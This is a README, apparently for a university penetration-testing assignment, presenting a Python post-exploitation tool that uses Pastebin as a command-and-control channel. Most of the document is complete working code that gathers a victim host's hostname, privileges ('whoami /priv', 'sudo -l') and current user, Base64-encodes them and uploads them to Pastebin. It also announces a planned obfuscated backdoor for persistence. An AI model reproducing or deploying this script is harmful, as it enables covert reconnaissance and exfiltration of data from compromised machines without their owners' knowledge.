# Pastebin API Experiment as Post-Exploitation C2

## The Background

This project has been done to complete a GLS University Task which was given in
_Programming for Penetration Testing_.

Created by myself,
Felix Alexander (2301859253)


The project itself has a functionality to forward all the basic information data that can
be retrieved from the `victim host` to `Pastebin` with its own API.

Prerequisites:
* API Developer Key
* Pastebin Username
* Pastebin Password
* Arbitrary Data/Content

## Snippets Code Review

The following script is required to get OS Info of the victim, whether it's `Windows` or `Linux` or
`OS X`, with a little help from `sys` Python's module.

```python
def osinfo():
    poss_plat = {
      'linux':'Linux',
      'linux1':'Linux',
      'linux2':'Linux',
      'win32':'Windows',
      'cygwin':'Windows',
      'msys':'Windows',
      'darwin':'OS X',
      'os2':'OS X',
      'os2emx':'OS X'
    }
    return poss_plat[sys.platform]
  ```
  
  In order to retrieve what data that can be retrieved, we need to know how the desired data will be parsed
  from each of unique victim OS. Therefore, there's an OS classification for executing each command.
  The following snippets will do:
  
  ```python
  def execute_cmd(cmd):
      try:
        cmd = cmd.decode()
      except (UnicodeDecodeError, AttributeError):
        pass
      if cmd == "sudo -l":
        prc = subprocess.Popen(cmd, stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
        out, err = prc.communicate()
        if re.search("incorrect",err.decode(),re.IGNORECASE):
          return b"Unprivileged / Not sudoers"
      prc = subprocess.Popen(cmd, stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
      out, err = prc.communicate()
      return out


def info_gathering(os):
	command = []
	if os == "Windows":
		logged_user = getpass.getuser()
		command.append(b"Hostname:\n" + execute_cmd('hostname') + b"\n")
		command.append(b"Priv:\n" + execute_cmd('whoami /priv') + b"\n")
		command.append(b"Logged user (currently):\n"+logged_user.encode())
		cmd = base64.b64encode(b"".join(command))
		return cmd
	elif os == "Linux" or os == "OS X":
		logged_user = getpass.getuser()
		command.append(b"Hostname:\n" + socket.gethostname().encode() + b"\n")
		command.append(b"Priv:\n" + execute_cmd('sudo -l') + b"\n")
		command.append(b"Logged user (currently):\n"+logged_user.encode())
		cmd = base64.b64encode(b"".join(command))
		return cmd
```

After the desired data has been retrieved, it'll be encoded as Base64 Byte-Objects Strings, which will be forwarder to the
API.

## Pastebin API

The following script will handle the pastebin auth and the upload process, where all the prerequisites data will be processed as
JSON Data to be requested to the API Post URL.

```python
def pastebin_upload(tl, data):
      name = '' #fill your pastebin username
      pw = '' #fill your pastebin password
      api_key = ''  #fill your api dev key (from tab API)
      auth = 'https://pastebin.com/api/api_login.php'
      auth_json = {
        'api_dev_key':api_key,
        'api_user_name':name,
        'api_user_password': pw
      }
      r = requests.post(auth, data=auth_json)
      api_user_key = r.text
      paste_post = 'https://pastebin.com/api/api_post.php'
      paste_json = {
        'api_paste_name':tl,
        'api_paste_code':data.decode(),
        'api_dev_key':api_key,
        'api_user_key':api_user_key,
        'api_option':'paste',
        'api_paste_private':0
      }
      r = requests.post(paste_post, data=paste_json)
      try:
        print("Retrieving the link!")
        print(r.text)
      except:
        print("Failed")
```
Note that, there are 3 values that need to be filled (crucial). The auth URL is stored in the `auth` variable, and the
API Url which will be processed to receive the post data is stored in `paste-post` variable.

## TBA

I'm planning on adding some persistence mode that will assign a backdoor on each unique OS with obfuscated
Python bytecodes so that the attacker can still connect to the OS Victim.


## Full Script

```python
import sys,socket,re
import requests,base64
import subprocess,getpass

def execute_cmd(cmd):
	try:
		cmd = cmd.decode()
	except (UnicodeDecodeError, AttributeError):
		pass
	if cmd == "sudo -l":
		prc = subprocess.Popen(cmd, stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
		out, err = prc.communicate()
		if re.search("incorrect",err.decode(),re.IGNORECASE):
			return b"Unprivileged / Not sudoers"
	prc = subprocess.Popen(cmd, stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
	out, err = prc.communicate()
	return out


def info_gathering(os):
	command = []
	if os == "Windows":
		logged_user = getpass.getuser()
		command.append(b"Hostname:\n" + execute_cmd('hostname') + b"\n")
		command.append(b"Priv:\n" + execute_cmd('whoami /priv') + b"\n")
		command.append(b"Logged user (currently):\n"+logged_user.encode())
		cmd = base64.b64encode(b"".join(command))
		return cmd
	elif os == "Linux" or os == "OS X":
		logged_user = getpass.getuser()
		command.append(b"Hostname:\n" + socket.gethostname().encode() + b"\n")
		command.append(b"Priv:\n" + execute_cmd('sudo -l') + b"\n")
		command.append(b"Logged user (currently):\n"+logged_user.encode())
		cmd = base64.b64encode(b"".join(command))
		return cmd
		
def osinfo():
	poss_plat = {
		'linux':'Linux',
		'linux1':'Linux',
		'linux2':'Linux',
		'win32':'Windows',
		'cygwin':'Windows',
		'msys':'Windows',
		'darwin':'OS X',
		'os2':'OS X',
		'os2emx':'OS X'
	}
	return poss_plat[sys.platform]

def pastebin_upload(tl, data):
	name = '' #fill your pastebin username
	pw = '' #fill your pastebin password
	api_key = ''  #fill your api dev key (from tab API)
	auth = 'https://pastebin.com/api/api_login.php'
	auth_json = {
		'api_dev_key':api_key,
		'api_user_name':name,
		'api_user_password': pw
	}
	r = requests.post(auth, data=auth_json)
	api_user_key = r.text
	paste_post = 'https://pastebin.com/api/api_post.php'
	paste_json = {
		'api_paste_name':tl,
		'api_paste_code':data.decode(),
		'api_dev_key':api_key,
		'api_user_key':api_user_key,
		'api_option':'paste',
		'api_paste_private':0
	}
	r = requests.post(paste_post, data=paste_json)
	try:
		print("Retrieving the link!")
		print(r.text)
	except:
		print("Failed")

print("Processing information . . .")
data_post = info_gathering(osinfo())
print("Uploading paste . . .")
pastebin_upload("secret",data_post)
```

## References
https://www.amazon.com/Black-Hat-Python-2nd-Programming/dp/1718501129 (pg. 146)
